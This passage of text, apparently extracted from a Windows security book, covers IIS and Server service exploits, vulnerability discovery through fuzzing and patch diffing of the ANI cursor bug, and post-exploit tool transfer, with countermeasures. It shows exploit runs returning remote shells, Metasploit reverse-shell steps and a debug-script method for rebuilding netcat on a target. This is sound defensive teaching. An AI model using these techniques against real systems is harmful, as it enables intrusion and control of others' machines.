Simplicity: Impact:  Risk Rating:  10 10 7 9  One of the most frequently attacked Windows services has been Microsoft’s World  Wide Web server implementation, Internet Information Services  IIS . Microsoft has done  a good job of addressing most of the major security vulnerabilities in IIS in recent versions.   As of this writing, no “Critical” severity vulnerability has appeared in a contemporary  version of IIS since late 2002, according to Microsoft’s Security Bulletin online search tool.   However,  because  we  still  encounter  older  versions  of  IIS  that  are  exposed  to  hostile  networks, and because you never know when a new streak of serious IIS vulnerabilities  may be discovered, we include a brief description of an IIS exploit here.  As discussed in Chapter 4, discovering the make and model of a web server is a fairly  straightforward endeavor. It’s also no real stretch to research published vulnerabilities in  the identified server software. Consider, for example, the SSL PCT remote buffer overflow  condition that exists for IIS, as described in Microsoft Security Bulletin MS04-011. Now,  all an attacker needs do is find some exploit code. For this example we went to www  .k-otik.com and found a very useful packaged exploit for the SSL PCT  Secure Sockets  Layer Private Communication Technology  vulnerability.  After downloading the exploit code and naming it iisexploit.c, we attempt to compile  it. For the average script kiddie, getting exploit code to compile is not always a simple    Chapter 5:  Hacking Windows-Specific Services   159  task,  especially  with  code  that  is  likely  cobbled  together  from  multiple  sources  with  injudicious  and often purposefully mischievous  splicing. Some time later, after resolving  multiple compiler errors related to missing header files, libraries, invalid references, and  so on, plus a couple of trips to Google to remind us how to set basic compiler parameters,  we now have our iisexploit.exe ready to run.  Launching iisexploit.exe from the command line is fairly straightforward  relative to   compiling it : C:\>iisexploit www.site.com myserver 8082 THCIISSLame v0.3 - IIS 5.0 SSL remote root exploit tested on Windows 2000 Server german english SP4 by Johnny Cyberpunk  jcyberpunk@thc.org   [*] building buffer [*] connecting the target [*] exploit send [*] waiting for shell [*] Exploit successful ! Have fun !  The exploit returns a shell to the attacker’s system on the predetermined port 8082.  As you just witnessed, exploiting a known vulnerability is quite simple and doesn’t  require  much  work.  But  thanks  to  exploit  development  frameworks  that  have  evolved  over the years, it can be even easier than this. For example, the Metasploit Framework is an  open-source  platform  for  developing,  testing,  and  launching  exploit  code.  It  is  easily  amplified with pluggable exploit modules contributed by the worldwide community of  folks engaged in “legal penetration testing and research purposes only” according to the  Metasploit website. Metasploit runs on most Linux UNIX platforms with Perl available. A  Cygwin-based  version  is  provided  for  Windows  systems.  Metasploit  provides  for  easy  exploitation of all types of vulnerabilities, including web platform holes. Commercially- supported exploit frameworks include CORE IMPACT from Core Security Technologies  and  CANVAS  by  Immunity.  For  links  to  more  information  about  Metasploit,  CORE  IMPACT, and CANVAS, see “References and Further Reading” at the end of this chapter. The  power  and  efficiency  of  Metasploit  is  impressive,  even  in  the  hands  of  semi- skilled adversaries. After downloading and installing the Framework distribution, an  attacker  can  be  ready  to  roll  with  prepackaged  exploits  within  5  minutes.  Metasploit  even sports a swift installation wizard. How convenient—and people think hacking is  hard work. Once installed, Metasploit can be accessed by either its command line or web  interfaces.  An attacker who wants to target the same IIS SSL PCT vulnerability using Metasploit  can simply select it from the list of precompiled exploits displayed in the Metasploit user  interface. Metasploit then displays a helpful screen that provides a description of the  vulnerability,  complete  with  references.  Metasploit  even  enables  us  to  select  from  a  number of payloads that can be delivered to the server  including remote shell, as we  demonstrated above . Upon clicking the Exploit button, Metasploit displays the success  status of the payload delivery, and the attacker is presented with console access to the  remote server.   160   Hacking Exposed Windows: Windows Security Secrets & Solutions   IIS Countermeasures A  number  of  good  IIS  lockdown  references  are  available   “References  and  Further  Reading” . We recommend consulting them for in-depth detail, but we’ve found that  excellent IIS security can be obtained by following this simple advice:     Make sure that you are running the most up-to-date version, with patches.    Conﬁ gure IIS conservatively  such as by disabling unneeded extensions and   ﬁ lters . In the speciﬁ c case of the SSL PCT vulnerability, disabling the outdated  PCT protocol mitigates the issue completely.     Implement network access control inbound and outbound from the web server  to protect against attacks on other non-IIS services and to restrict “phone home”  techniques such as remote shells, as demonstrated earlier.  Windows Server Service Exploit  Popularity: Simplicity: Impact:  Risk Rating:  10 10 7 9  One  of  the  most  important  services  on  Windows  servers  is,  not  surprisingly,  the  Server service. It supplies the basis for offering resources to clients  RPC calls, file and  print  services,  and  so  on .  Microsoft  originally  released  a  bulletin  on August  8,  2006,  titled “Vulnerability in Server service could allow remote code execution.” Even though  the name implies conditional exploitability, the reality is that the “service allows remote  code execution” according to the bulletin. The problem resided in the CanonicalizePathName  function. Canonicalization means normalizing the string handled by a function. For example, if data is presented  using  Unicode  with  different  encodings,  in  order  to  actually  use  the  information  the  system needs to normalize  decode  it to the simplest presentation form understood by  the  application.  Canonicalization  has  traditionally  been  targeted  by  attackers;  for  example, the old “dot-dot-slash” syntax for traversing file systems was once exploited  against IIS by using special encoding such as %255c or %a0%af instead of .. .  This  bug,  after  publication,  almost  immediately  caused  different  exploits  to  be   published, and it was also used in some malware.  Following is an example usage from the actual exploit written by Preddy:  kraken:~ hacks exploits jabba$ . ms06-40 127.0.0.1 Target: 127.0.0.1 Attack Finished: now open a new terminal and nc to your victim on port 54321 Warning: Don't close this window!

C:\WINDOWS\system32>  Even though this example is from XP, the bug was also exploitable on Windows 2003 at  the time.  Countermeasures to Windows Server Service Exploit Since the Server service cannot practically be disabled, the only thing left to do is damage  control—not opening the service to the Internet, and then maybe hardening the vectors  that typical exploits use to get code execution. Of course, the proper patch-management  procedures help with this, together with mitigating the problem with intrusion protection  systems, segmentation, and so on.  SUMMARY  In  this  chapter,  we’ve  covered  attacks  against  Windows  services,  ranging  from  the  mundane  password guessing , to the sophisticated  MITM attacks , to the flat-out nasty   MSRPC  interface  buffer  overflows .  Although  your  head  may  be  spinning  with  the  number of attacks that are feasible against Microsoft’s network protocols, the following  are the most important defensive points to remember:     Block access to Windows-speciﬁ c services using network and host-based  ﬁ rewalls. Windows XP SP2 and Vista bring enhancements to the built-in  Windows Firewall that do much of this by default.     Disable Windows services if they are not being used; for example, unbinding   File And Printer Sharing for Microsoft Networks from the appropriate adapter  is the most secure way to disable SMB services on Windows.  See Chapter 4 for  more information.      If you must enable SMB services, set the Security Policy Network Access options  appropriately to prevent easy enumeration of user account names  see Chapter 4 .     Enforce strong passwords using Security Policy Account Policies Passwords   Must Meet Complexity Requirements setting.  Also check the links about  passphrases to help you choose easy-to-remember yet hard-to-crack passphrases.      Enable account lockout using Security Policy Account Policies Account   Lockout Policy.     Lock out the true Administrator account using passprop, and on later Windows   versions use the provided functionality in the security policy conﬁ guration.    Rename the true Administrator account and create a decoy Administrator   account that is not a member of any group.     Enable auditing of logon events under Security Policy Audit Policy and review   the logs frequently, using automated log analysis and reporting tools as warranted.     Carefully scrutinize employees who require Administrator privileges and   ensure that proper policies are in place to limit their access beyond their terms  of employment.   162   Hacking Exposed Windows: Windows Security Secrets & Solutions      Set the Network Security: LAN Manager Authentication Level to at least Send   NTLM Response Only on all systems in your environment, especially legacy  systems such as Windows 9x, which can implement LM Authentication Level 3  using the DSClient update on the Windows CD-ROM. In fact, anything lower than  NTLMv2 allows very fast brute-force attacks on captured authentication messages.    Be wary of HTML e-mails or web pages that solicit logon to Windows resources   using the ﬁ le:   URL  although such links may be invisible to the user .     Keep up with patches  as always .    Did we mention reviewing those logs?  And last but not least, don’t forget that Windows authentication and related services  are only the most obvious doors into Windows systems. Even if SMB is disabled, plenty  of other good avenues of entry are available, including IIS and SQL  Chapter 9 . Don’t  get a false sense of security just because SMB is buttoned up!

In most months, patches are  released. Black Tuesday marks the day that security researchers download patches  and begin reverse engineering them in an effort to discover how to exploit unpatched  machines. How are these security issues discovered and how can they be exploited? This  chapter discusses the types of bugs that affect the Windows platform, how to discover  them, and how they can be exploited.  SECURITY VULNERABILITIES  Software security vulnerabilities often stem from an oversight in the code, configuration,  design, or environment of a particular technology component. For example, the Windows  Animated  Cursor  Remote  Code  Execution  Vulnerability  is  a  code-borne  issue,  as  it  is  the  result of inappropriate buffer management. On the other hand, the Arbitrary File Rewrite  Vulnerability in Internet Explorer is the result of a configuration oversight. This issue was  resolved  simply  by  “killbiting,”  or  disabling,  the  NMSA  Session  Description  Object  ActiveX control within Internet Explorer.  Vulnerabilities, despite their origin, typically result in elevation of privileges  EoPs   or denial of service  DoS  attacks. Depending on the threat modeling methodology to  which you subscribe, this list can be expanded to include additional threats. For example,  Microsoft’s threat modeling methodology calls out six threat categories  STRIDE :     Spooﬁ ng identity    Tampering with data    Repudiation    Information disclosure    Denial of service    Elevation of privileges     Compiling    Code review    Reverse-engineering  Arguably, the first four could be considered artifacts of an EoP. They are provided here  to ensure that you have a clear understanding of the various flavors in which “bad” is  available.  FINDING SECURITY VULNERABILITIES  How are these vulnerabilities discovered? In some instances, it can be as easy as using  the software, or it can take many moons of research. Typically, discovering a vulnerability  is the result of one or more of the following exercises:   Chapter 6:  Discovering and Exploiting Windows Vulnerabilities   167     Fuzzing    Ad hoc testing    Static analysis    Dynamic analysis  runtime     General usage  We discuss reverse-engineering and fuzzing in more detail later in this chapter. First,  let’s discuss some of the ways Windows can be configured to help detect security defects.  Prep Work  Windows comes equipped with a variety of tools that aid in our ability to search and  locate  vulnerabilities.  Most  notable  are  the  image  file  execution  options  and  global  flags   GFlags . Image file execution options allow us to tweak certain attributes and behaviors  of an application’s process space. For example, we can force Windows to perform sanity  checks on the heap after memory is freed or to pad memory allocations with guard pages  so we can detect heap overflows.  For a complete list of options, see GFlags Remarks in  the “References and Further Reading” section.   We can set these options manually in the Registry at HKLM\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Image File Execution Options, or we can lean on a GUI  utility provided as part of the Debugging Tools for Windows package, gflags.exe.  Assume  the  following  code  listing   numbered  for  convenience   represents  an   application in which we want to detect heap overflows: 1  include   2  include   3  include   4 5  define ALLOC_SIZE 1024 6  INT main INT argc, PCHAR *argv  7  { 8     PCHAR pBlob =  PCHAR malloc ALLOC_SIZE ; 9 10    if !SUCCEEDED pBlob   11    { 12        return 0; 13    } 14 15    memset pBlob, 'A', ALLOC_SIZE + 1 ; 16    printf “%s\n”, pBlob ; 17    free pBlob ; 18 19    return 0; 20 }   168   Hacking Exposed Windows: Windows Security Secrets & Solutions   On  line  15,  you  can  see  that  a  1-byte  heap  overflow  is  occurring.  If  we  compile  and  execute this program, it will print out a bunch of As and exit normally. However, if we  enable page heap for this image, heaptest.exe, we will break into the debugger upon  overflow.  To enable page heap for this image, perform the following steps:                 1.  Install Debugging Tools for Windows. 2.  Execute gﬂ ags.exe. 3.  In the Global Flags window, select the Image File tab. 4.  Type heaptest.exe in the Image box. 5.  Press the TAB key. 6.  Check Enable Page Heap. 7.  Click Apply. Your screen should look like Figure 6-1. Then click OK.  Figure 6-1  Enabling page heap for heaptest.exe   Chapter 6:  Discovering and Exploiting Windows Vulnerabilities   169  The GFlags utility is nothing more than a Registry editor. These values can be enabled manually  as well.  If we rerun the same code, heaptest.exe will break into the debugger, as shown in the   following listing: Microsoft  R  Windows Debugger  Version 6.6.0007.5 Copyright  c  Microsoft Corporation.

In the preceding code, you can see the debugger broke with an access violation while  within memset while trying to write 0x41  'A'  to the pointer in edi. If we disassemble  this area  with 'u' , we can see that edx is decremented each time a character is written to  the memory pointed to by edi. By looking at the value in edx, which is 1, you can see that  this is the last byte to be written. This corresponds with the 1-byte overflow in the source  code. If we were debugging in source mode, the debugger would highlight the offending  line of code as well. Hopefully, this paints a clear picture for the usefulness of page heap.  Fuzzing In  its  simplest  form,  fuzzing  can  be  described  as  introducing  malformed  data  to  an  application  in  an  automated  fashion.  The  primary  benefit  of  fuzzing  is  that  once  the  fuzzer has been built, you can leave it alone until the target breaks in the debugger. This  frees up your time to investigate other areas of the application or write additional fuzzers.  A  decent  number  of  fuzzers  are  available,  depending  on  what  you’re  targeting.  Our  experience  has  shown  that  Michael  Eddington’s  Peach  Fuzzer  Framework  takes  the  proverbial cake when it comes to creating effective fuzzers quickly.   170   Hacking Exposed Windows: Windows Security Secrets & Solutions   Peach Fuzzing Peach is a Python-based fuzzing framework, not a fuzzer. It provides a set of classes and  supplemental tools that aid in rapid fuzzer development. At the core of a Peach fuzzer  are generators, groups, and transformers. Generators are responsible for creating data  malformations, groups control iteration and relationships between the data malforma- tions, and transformers convert the generated data to another format, such as Base64.  For an overview of how these classes work, you can read the Peach Tutorial at http:   peachfuzz .sourceforge.net docs tutorial peach-tutorial.htm.  Peach comes with a couple slick tools, too. Most notably is peachshark.py. This gem  will  digest  a  Wireshark   http:  www.wireshark.org   packet  capture,  when  saved  in Portable Document Markup Language  PDML  format, and create a fuzzer for you. For  example, the following steps will produce a simple HTTP fuzzer:                  1.  Start Wireshark. 2.  Start snifﬁ ng: Choose Capture  Start. 3.  Browse to a website. 4.  Stop snifﬁ ng: Choose Capture  Stop. 5.  Select an HTTP GET request, as shown in Figure 6-2. 6.  Choose File  Export  File to open the Export File window, as shown in Figure   6-3, and export the selected packet in PDML format.  7.  From your command prompt or shell, execute python peachshark.py   packet.pdml http > httpfuzz.py:  Figure 6-2  Select an HTTP GET request.   Chapter 6:  Discovering and Exploiting Windows Vulnerabilities   171  Figure 6-3  Export the selected packet in PDML format.  Peachshark.py requires the 4Suite XML package available from http:  4suite.org.  The result is a functional HTTP fuzzer. This auto-generated fuzzer has some limita- tions, such as its ignorance to valid HTTP methods other than GET. However, adding  other valid HTTP methods takes only a few seconds. In addition, this auto-generated  fuzzer will fuzz every header within the original request, along with individual subcom- ponents of each header value. This is because the auto-generated fuzzer incorporates a  fairly useful, and somewhat brutish, generator, StringTokenFuzzer. This generator ac- cepts a string and segments it based on a configurable set of tokens, such as a comma,  space, colon, semicolon, and so on. This tree of segments is then walked and fuzzed in- dividually. Now we can simply point the fuzzer at our target web server: C:\projects\peach\tools>python httpfuzz.py count ]] Http Fuzzer by PeachShark  : GroupSequence.next  : GroupCompleted [949] : GroupSequence.next  : GroupCompleted [19889] : GroupSequence.next  : GroupCompleted [4737] : GroupSequence.next  : GroupCompleted [90914] : GroupSequence.next  : GroupCompleted [12313] : GroupSequence.next  : GroupCompleted [10419]   172   Hacking Exposed Windows: Windows Security Secrets & Solutions   : GroupSequence.next  : GroupCompleted [13260] : GroupSequence.next  : GroupCompleted [65345] : GroupSequence.next  : GroupCompleted [11366] : GroupSequence.next  : GroupCompleted [10419] : GroupSequence.next  : GroupCompleted [33147] : GroupSequence.next  : GroupCompleted [4737] Total of 277494 test cases  C:\projects\peach\tools>python httpfuzz.py tcp 127.0.0.1 80  ]] Http Fuzzer by PeachShark  Running fuzzer on 127.0.0.1:80 via tcp  As the fuzzer runs, a test number will appear along with the HTTP server’s response to  each fuzz test. At this point, you can sit back and let the fuzzer run while you work on  something else.  Reverse-Engineering In the absence of source code, we can always disassemble binaries and look for security  issues within the assembly. But where to start? One option is to download patches for  previous security bugs and compare them against unpatched versions. The portions of  the binaries that do not match will probably point to a security issue.  The  remainder  of  this  section  discusses  how  to  go  about  unpacking  a  Microsoft  Update package  .MSU , comparing the new dynamic link library  DLL  to the old, and  identifying the security issue. We will use the Animated Cursor  MS07-17  bug identified  by Determina’s Alexander Sotirov, whose excellent technical description of this condition  was the primary reference for the vulnerability’s details. We will also lean on previous  work performed by the Metasploit project to demonstrate how MS07-17 can be exploited  on Microsoft Vista.  Unpacking an Update As stated, one way to discover vulnerabilities within Windows is to unpack the Microsoft  Update package and compare the new DLL with the old one. Once we’ve identified the  bug  in  which  we  are  interested,  in  this  case  MS07-17,  we  first  download  the  fix  and  unpack it: C:\projects\reverse\KB925902>expand -F:* Windows6.0-KB925902-x86.msu .

The file of most  interest is Windows6.0-KB925902-x86.cab, as it will contain the updated binaries.  WSUSSCAN.cab is used by tools such as Microsoft Baseline Security Analyzer  MBSA  to perform  offline scanning of system patch levels.  We can expand Windows6.0-KB925902-x86.cab in the same manner used with the  update package, which will provide a series of directories and manifests. In the x86_ microsoft-windows-user32_31bf3856ad364e35_6.0.6000.16438_none_cb39bc5b7047127e  directory, we will find the patched version of user32.dll. The next step is to compare this  patched version against the old unpatched version in hopes of locating the bug. Locating the Bug To perform this step, we use a free tool created by the bright folks on the eEye Research  Team: Binary Diffing Suite  BDS  can be downloaded from http:  research.eeye.com  html tools RT20060801-1.html.  BDS requires Data Rescue’s IDA Pro.  Once installed, fire up the Binary Diffing Starter and perform the following steps:  1.  Within the Path Conﬁ guration frame, select File Difﬁ ng. 2.  For Pre-Patch, browse and select the unpatched version of user32.dll. 3.  For Post-Patch, browse and select the patched version of user32.dll. 4.  For Output-Path, browse and select your working directory. 5.  In the BDS Levels area, ensure that both boxes are checked. 6.  In the Plugins area, select DarunGrim. Your screen should look like Figure 6-4. 7.  At this point, click Start and wait for the program to tell you it’s complete. Once   it’s complete, you will see a ﬁ le called user32.dll.dg.db in your Output-Path.  Close the Binary Diffing Starter and fire up DarunGrim. Once loaded, perform the   following steps to diff the patched and unpatched binaries.  1.  Choose File  New. The Analyze dialog box will appear. 2.  Click Pre-patch. 3.  Right-click Select Analida Generated File and browse to user32.dll.dg.db. 4.  Expand user32.dll.dg.db and select the unpatched user32.dll.                           174   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 6-4  Binary Difﬁ ng Starter setup         5.  Click Post-patch, expand user32.dll.dg.db, and select the patched user32.dll. 6.  Click Result and select user32.dll.dg.db. 7.  Click Start Analyze.  Depending  on  the  horsepower  of  your  computer,  this  may  take  a  while.  Once  complete, you will see a table that contains, among other things, the names of subroutines  and their match rates. The Match Rate value should theoretically be between 1, a perfect  match,  and  0,  a  considerably  less  than  perfect  match.  Because  we  are  looking  for  potentially subtle changes, we should focus on subroutines that are a near perfect match.  We can do this by sorting the Match Rate in ascending order to end up with the screen  shown in Figure 6-5.   Chapter 6:  Discovering and Exploiting Windows Vulnerabilities   175  Figure 6-5  Sorted subroutine match table  On  the  fourth  row  down,  _LoadAniIcon@20  should  probably  jump  out  as  significant,  considering  that  we  are  attempting  to  locate  a  bug  related  to  animated  cursors. The next step is to right-click this row and select Diff. This will present a dual- paned window containing color-coded call graphs, as shown in Figure 6-6.  The unpatched version is on the left, and the patched version is on the right. There’s  a lot going on in here, so what’s significant? Odds are that the patch will result in the    176   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 6-6  Call graphs of patched and unpatched versions of user32.dll  inclusion or absence of logic in the new DLL. Look at the bottom of this window, and  you’ll see a key that explains the color codings. You can see that blocks colored in peach  have no corresponding match between versions. A peach-colored block is staring right at  you in the right window pane. This represents logic that is not present in the unpatched  version. Let’s check it out by zooming in a bit, as shown in Figure 6-7. Here you can see that the additional block is comparing a local variable to 24h. If the  value matches, execution jumps to loc_77D656A0 and off to ReadChunk. If the value  doesn’t  match,  execution  falls  to loc_77D8504D  at  the  bottom  of  the  graph,  which  effectively returns from the function.   Chapter 6:  Discovering and Exploiting Windows Vulnerabilities   177  Figure 6-7  Additional block in patched version  So what’s it comparing? Let’s crawl up the graph a bit and see if we can figure it out.  At loc_77D653F1, we can see that the eax register is being compared to 0x68696E61. This value, represented in ASCII and adjusted for “endianness,” is anih. This is a fairly  identifiable string. Let’s see if we can get a couple hints from an actual ANI file as to what  is  going  on.  We’ve  opened  C:\Windows\Cursors\aero_busy.ani  in  a  hex  editor,  as  shown in Figure 6-8.  SweetScape’s 010 Editor is great for this type of analysis, as it allows you to quickly create templates  with which it will overlay the file contents. When viewing a file, the template is “applied” to the file,  which provides the user with the context of the outline. A template will indicate that the first four bytes  are the Type, the next four are the Length, and next Length number bytes are the data.   178   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 6-8  Hex view of an animated cursor  Sweet! On the first line you can see the string anih. This code segment is probably  parsing this portion of the file. Coincidently, the very next byte is 0x24, which coincides  with the value the patched version of user32.dll is expecting. Knowing that we had to  convert hina to anih due to endianness, we should probably consider doing the same for  0x24.  If  you  look  at  the  next  three  bytes,  you  can  see  they  are  all  zero.  If  we  adjust  0x24000000 as we did with hina, we end up with 0x00000024, which remains 0x24. We might be getting someplace. So what’s next? Well, many protocols and data structures  lean on a format known as Type Length Value  TLV . The first field, the Type, describes the  data; the second field, Length, tells how much data there is; and the third field, Value, is the  actual data referred to by the Type and Length. This may very well be what’s happening.  To confirm this, let’s convert 0x24 to decimal 36, count that number of bytes in the file, and  see where we end up. We land right in front another potential Type: rate. If we perform  the same steps for rate we end up at LIST. If we go in the other direction we can see that  the 4 bytes after RIFF, 0x782E0100, represent the Size of its Value, the rest of the file. From  this,  we  can  probably  assume  that  the  comparison  of 0x24  in  the  patched  version of user32.dll is ensuring that the advertised size of the anih Value is 36 bytes. So  let’s  copy  aero_busy.ani  to  another  directory,  change  the  advertised  Size  of  the anih Value to 0xFF, set a breakpoint on LoadAniIcon, browse to the modified file in Explorer,  and see what happens. Nothing happens! But if we change the size back to 0x24 we hit the breakpoint. If we  continue  in  the  debugger,  we  may  notice  that  the  icon  for  aero_busy.ani  in  Explorer  changed  from  the  generic  white  piece  of  paper  back  to  the  expected  aero  icon.  This  indicates that Explorer is giving up before it completely loads the icon information from  our modified cursor.  Here’s what we have so far:     The patch ensures that the ANI header is 36 bytes.    If we misrepresent the size of the ANI header, the icon does not load in Explorer.   Chapter 6:  Discovering and Exploiting Windows Vulnerabilities   179     Based on the disassembly, we know LoadAniIcon will parse anih chunks.    If we misrepresent the size of the ANI header, we never hit LoadAniIcon. From this, we can probably assume that something is validating the size of the ANI  header  before  we  actually  get  to LoadAniIcon.  If  this  is  true,  why  would  the  patch  perform a size check as well? Remember when we were attempting to validate our hunch  that the anih chunk was a TLV structure, and we encountered other TLV structures as  well—rate and LIST. What happens if we change one of these structures to Type anih and fib about the size there? Let’s give it a try. I’ve modified aero_busy.ani as shown in  Figure 6-9. If we refresh Explorer, we hit our breakpoint on LoadAniIcon. This is encouraging!   Now, let’s continue execution and see what we get.  770.c08 : Access violation - code c0000005  first chance  First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=00000000 ebx=05bcda24 ecx=00000000 edx=00000003 esi=5453494c edi=00000000 eip=76badfc8 esp=05bcd8ec ebp=05bcd94c iopl=0         nv up ei pl nz na pe nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 USER32!LoadAniIcon+0x2b7: 76badfc8 ff34be        push    dword ptr [esi+edi*4] ds:0023:5453494c=???????? Access violation in LoadAniIcon! We are definitely on the right track! We can see by the  ???????? in the last line that the address 0x5453494C is pointing to outer space. This  address is the result of evaluating esi+edi*4. Since edi is zero, the address is fully  dependant on esi, which is 0x5453494C. This address looks a lot like ASCII. In the  same way 0x68696E61 converted to anih, 0x5453494C converts to LIST. This is a  familiar value, isn’t it? It looks like our modifications allow us to control at least the esi register. From this listing, we see this is a first chance exception. A first chance exception  refers to a condition where the debugger stops the application from executing and alerts  the person debugging it. This means we have been given control before any exception   Figure 6-9  Updated aero_busy.ani ﬁ le   180   Hacking Exposed Windows: Windows Security Secrets & Solutions   handlers are invoked, including the Structured Exception Handler  SEH .

We now fully control three registers: eax, ebp, and the most  significant,eip. By controlling these registers, you can cause Explorer to execute arbitrary  code that is embedded within the animated cursor itself. The next section discusses how  this issue can be exploited on the Vista platform despite its many security mechanisms  such as Address Space Layout Randomization  ASLR , Data Execution Prevention  DEP ,  and stack cookies  GS .  As you are probably aware, Vista comes equipped with a handful of mechanisms that are  designed to prevent the exploitation of vulnerabilities. Of most significance are ASLR,  DEP, and GS. We discuss these and other security mechanisms in Chapter 12. For now,  you should be familiar with the following:     ASLR randomizes the location of memory allocations to make it more difﬁ cult   for an attacker to know the location of useful instructions or libraries.     Hardware DEP attempts to prevent exploitation by preventing code execution   at memory locations that have not been explicitly designated executable.  Software DEP protects exception registration records from abuse.     GS attempts to prevent exploitation by detecting stack-based buffer overﬂ ows.  In  the  preceding  section,  we  were  able  to  construct  an  .ani  file  that  clobbered  the  stack, including the exception registration record. How is this possible in the presence of  GS  and  Software  DEP?  As  noted  by  Alexander,  and  shown  in  the  following  listing,  LoadAniIcon was not compiled with GS’s protection: 0:032> u USER32!LoadAniIcon USER32!LoadAniIcon: 75c05375 8bff            mov     edi,edi 75c05377 55              push    ebp 75c05378 8bec            mov     ebp,esp   182   Hacking Exposed Windows: Windows Security Secrets & Solutions   75c0537a 83ec50          sub     esp,50h 75c0537d 53              push    ebx 75c0537e 8b5d08          mov     ebx,dword ptr [ebp+8] 75c05381 8b03            mov     eax,dword ptr [ebx] 75c05383 56              push    esi  If  GS  were  enabled,  we  would  see __security_cookie  being  placed  on  the  stack.  See  Chapter 12 for details.  To make matters a bit worse, neither Explorer nor Internet Explorer has DEP enabled  by default. This can be observed by firing up Process Explorer and viewing the Image  tab for these processes, as shown in Figure 6-11.  That leaves us with ASLR. As pointed out by skape of the Metasploit Project, if we  are able to find useful instructions within the same 16-page block as the return address,  we can simply overwrite the two low-order bytes of the return address with their location   Figure 6-11    Internet Explorer with DEP disabled by default   Chapter 6:  Discovering and Exploiting Windows Vulnerabilities   183  and we’re good. Because GS is a non-factor in this case, we can overwrite the return  address in this manner. Given that DEP and GS are disabled for IE and Explorer and, in  this instance, we can circumvent the benefits of ASLR, we are left with a fairly typical  exploit. Let’s see it in action.  Version  3  of  the  Metasploit  Framework  comes  equipped  with  a  spiffy  Web  2.0  interface that allows just about anyone to point and click his or her way to remote code  execution on an unpatched box. Once Metasploit is installed and running, it takes literally  five clicks to have an evil web server waiting to provide an unknowing browser with the  exploit. And here they are:             1.  Click Exploits. 2.  Click Windows ANI LoadAniIcon   Chunk Size Stack Overﬂ ow  HTTP . 3.  Click Windows Vista user32.dll 6.0.6000.16386. 4.  Click windows meterpreter reverse_ord_tcp. 5.  Click Exploit after ﬁ lling in LHOST.  At this point, Metasploit will provide a URL that, once visited by an unpatched Vista   box, will exploit the ANI bug and load up the Meterpreter: [*] Started reverse handler [*] Using URL: http:  192.168.111.1:8080 ykceBiH [*] Server started.

Hopefully, this example  has given you some idea of the ease with which Windows vulnerabilities can be exploited  using powerful frameworks such as Metasploit.   184   Hacking Exposed Windows: Windows Security Secrets & Solutions   SUMMARY  This  chapter  illustrates  how  Windows  exploits  are  discovered  and  implemented.  In  practice, these techniques  and many more of lesser and greater sophistication  suggest  that  Windows  will  always  be  vulnerable  to  persistent  reverse-engineering,  so  a  combination of conservative system configuration, an ongoing update process for new  releases that include features such as ASLR, and an efficient patching program should all  be combined to achieve defense-in-depth.

They want complete domination and control, and an attacker will not settle for  simply  gaining  user-level  privileges  on  one  system.  Higher  privileges  mean  wider access to information  the actual thing that is protected . Consequently, an attacker  will perform many steps to infiltrate your network further and further, making it next to  impossible for you to rid it of the attacker without your “invading” the environment  yourself in a serious way—that is, you need to rebuild numerous systems from scratch   using trustworthy backups . The attacker’s post-exploit pillaging phase is fundamental  to any serious network attack.  The following misdeeds can be undertaken by an attacker once he or she gains access   to your system:               1.  Transfer attack toolkit to the target. 2.  Escalate privileges  if necessary to achieve administrative rights . 3.  Establish remote interactive control. 4.  Mine system data. 5.  Extract and crack passwords. 6.  Rinse and repeat.  Attackers will also seek to hide their presence using numerous tools and techniques that are discussed  at length in Chapter 8.  We  discuss  each  of  these  steps  in  this  chapter  to  show  you  how  to  prevent  your   systems from being used as a jumpstation to other targets in the network.  TRANSFERRING ATTACKER’S TOOLKIT  FOR FURTHER DOMINATION  Performing simple remote exploits of vulnerable programs or configurations only gives  the  attacker  a  presence  on  the  target  machine,  and  if  either  the  target  is  hardened  or  native tools are limited, the attacker cannot expand his presence further or gain a foothold  for gathering information. In these cases, a suitable toolkit needs to be transferred for  enumerating, escalating, and expanding his domination of the target. Such tools might  include, but are not limited to, local exploits to raise privileges for further enumeration  and port redirectors to reach otherwise externally unreachable hosts. It should be noted,  however, that some operating system tools can also be part of the attacker’s toolkit.  With privilege escalation, the attacker usually has very limited access to box credential  storage or otherwise valuable information stored on that host. Bypassing normal access  control requires greater privileges. Privilege escalation can be attempted in a number of  ways,  for  instance,  by  performing  local  exploits  for  vulnerable  programs  and  configurations.  After  gaining  more  privileges,  the  attacker  can  ensure  presence  by    Chapter 7:  Post-Exploit Pillaging   187  installing backdoors or rootkits, or he can retrieve information available only for users  with  greater  privileges—which  then  helps  the  attacker  expand  his  presence  in  other  areas on the network.  Transferring a Toolkit  Popularity: Simplicity: Impact: Risk Rating:  9 4–7 9 9  Remember that the compromised host is often just the entry point to what the attacker   is really looking for: sensitive information.  After  gaining  remote  or  local  code  execution  possibilities,  an  attacker  typically  transfers a toolkit to the target system. Such tools might include, but are not limited to,  password  extractors,  a  scripting  language   if  one  does  not  already  exist ,  and  port  forwarders to help establish a presence on the network.  The methods used for transferring data can vary, but they often make use of allowed  protocols,  such  as  HyperText  Transfer  Protocol   HTTP ,  File  Transfer  Protocol   FTP ,  Domain Name System  DNS , Simple Mail Transfer Protocol  SMTP , and others. In the  case  of  HTTP HTTPS FTP,  the  attacker  can  make  use  of  the UrlDownloadToFile function in urlmon.dll. It is easy for an attacker to write a command-line tool to utilize  this API and make an outbound connection through one of the supported protocols after  gaining access to the system. However, this works only if outbound connections from the  target systems are allowed, and it points out the importance of having control of outbound  connectivity.  It  is  interesting  to  note  that  the  urlmon API  also  supports  situations  in  which a proxy has been defined for the normal browsers. Other commands from the  system can also be used, such as FTP.EXE, TFTP.EXE, and so on. Different malwares  have been known to use the Background Intelligent Transfer Service  BITS  to download  files from the Internet.  As an outbound connection is not always available, the attacker can also use one- way connectivity. Typically, this includes transferring the binary code into ASCII format,  commonly known as debug scripts, to be fed to debug.exe on the target system. A couple  of such tools exist and can be found in the “References and Further Reading” section at  the end of the chapter.  Following is a snippet of a debug script:  n tempf r cx e800 f 0100 ffff 00 e 0100 4d 5a 90 e 0104 03 . . .   188   Hacking Exposed Windows: Windows Security Secrets & Solutions   Such a script needs to be fed to the debug executable and then renamed with an .exe   file extension, as shown here:       Debug < script.scr       ren script.scr nc.exe  Once renamed, the tool can be used as normal. One note also for the above example is  that it uses a more optimized algorithm to make debug scripts smaller by taking away  most common 